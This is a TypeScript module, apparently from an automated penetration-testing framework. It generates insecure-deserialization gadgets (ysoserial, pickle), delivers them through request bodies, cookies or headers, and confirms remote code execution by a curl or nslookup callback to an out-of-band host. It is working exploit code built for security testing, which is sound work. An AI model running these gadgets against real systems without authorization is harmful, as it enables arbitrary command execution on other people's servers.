/**
 * deserialization — insecure deserialization RCE (Java/.NET/Python).
 *
 * Builds a gadget via gadgetGen (user-configured ysoserial / pickle), delivers
 * it to a deserialization sink (cookie, body, header per ctx), and confirms RCE
 * out-of-band: the gadget command performs an OAST callback (DNS/HTTP), so
 * confirmation is a REAL received callback, not response-body guessing.
 *
 * Confirmed only when an OAST callback correlated to this run is observed AND
 * the claim is backed by a recorded evidence item (EvidenceGate).
 */

import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionResult, PrimitiveResult } from './framework'
import { claimFor } from './framework'
import { EvidenceGate } from '../intelligence/evidence-gate'
import { buildGadget, type GadgetSpec } from './gadgetGen'

export const deserialization: TechniquePrimitive = {
  id: 'deserialization',
  name: 'Insecure Deserialization RCE',
  description: 'Deliver a serialization gadget (Java/.NET/Python) to a deserialization sink and confirm RCE via out-of-band callback.',
  technique: 'injection',
  appliesTo(ctx: TechniqueContext): boolean {
    if (!(ctx.endpoint || ctx.target)) return false
    // Needs an OAST host to confirm blind RCE + a configured gadget lang.
    return !!(ctx.state?.oastHost && ctx.state?.gadgetLang)
  },
  async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
    const url = ctx.endpoint?.url ?? ctx.target!
    const method = ctx.endpoint?.method ?? 'POST'
    const oastHost = String(ctx.state?.oastHost)
    const lang = String(ctx.state?.gadgetLang) as GadgetSpec['lang']
    const chain = String(ctx.state?.gadgetChain ?? 'CommonsCollections1')
    // Command performs an OAST callback (nslookup/curl to the correlation host).
    const command = lang === 'python' ? `curl http://${oastHost}/` : `nslookup ${oastHost}`
    const gadget = await buildGadget({ lang, chain, command, ysoserialJar: ctx.state?.ysoserialJar as string, ysoserialNet: ctx.state?.ysoserialNet as string })
    if (!gadget) return []
    const encoded = Buffer.from(gadget, 'latin1').toString('base64')

    // Delivery vectors (data): body, cookie, custom header.
    const sink = String(ctx.state?.sink ?? 'body')
    const headers = { ...(ctx.sessionHeaders ?? {}) }
    const steps: AttackStep[] = []
    if (sink === 'cookie') {
      steps.push({ id: 'deser-cookie', description: `Gadget via cookie to ${url}`, request: { method, url, headers: { ...headers, Cookie: `session=${encoded}` } }, expectedSignal: 'OAST callback', metadata: { kind: 'deser', oastHost } })
    } else if (sink === 'header') {
      steps.push({ id: 'deser-header', description: `Gadget via header to ${url}`, request: { method, url, headers: { ...headers, 'X-Serialized': encoded } }, expectedSignal: 'OAST callback', metadata: { kind: 'deser', oastHost } })
    } else {
      steps.push({ id: 'deser-body', description: `Gadget via body to ${url}`, request: { method, url, headers: { ...headers, 'content-type': 'application/octet-stream' }, body: encoded }, expectedSignal: 'OAST callback', metadata: { kind: 'deser', oastHost } })
    }
    return steps
  },
  async oracle(results: StepExecutionResult[], evidenceGate: EvidenceGate): Promise<PrimitiveResult> {
    const r = results[0]
    if (!r) return { confirmed: false, confidence: 0, evidence: [], note: 'no delivery result (gadget build failed?)' }
    const oastHost = String(r.step.metadata?.oastHost ?? '')
    // OAST confirmation is recorded into the gate as an observed callback by the
    // caller (checkOastCallbacks). We verify the claim co-occurs with that.
    const { verified } = evidenceGate.verifyClaim(claimFor('deserialization', r.step.request.url, r.status, r.step.request.method))
    // The callback presence is signalled via extra.oastHit (set by the runner
    // after polling OAST); absent → unconfirmed (blind, no false positives).
    const oastHit = !!(r.extra?.oastHit)
    const confirmed = oastHit && verified
    return {
      confirmed, confidence: confirmed ? 0.95 : 0.1,
      evidence: confirmed ? [{ kind: 'oast', label: `deserialization RCE OOB callback from ${r.step.request.url}`, data: `callback host ${oastHost}`, ref: oastHost }] : [],
      severity: confirmed ? 'critical' : undefined,
      finding: confirmed ? { category: 'insecure_deserialization', description: `Insecure deserialization RCE confirmed on ${r.step.request.url} (OOB callback).`, cwe: 'CWE-502' } : undefined,
      exploitProof: confirmed ? { scenario: 'Insecure deserialization RCE', request: `${r.step.request.method} ${r.step.request.url}`, response: `OOB callback received at ${oastHost}`, impact: 'Arbitrary command execution on the server (out-of-band confirmed).' } : undefined,
      note: `oastHit=${oastHit} verified=${verified}`,
    }
  },
}
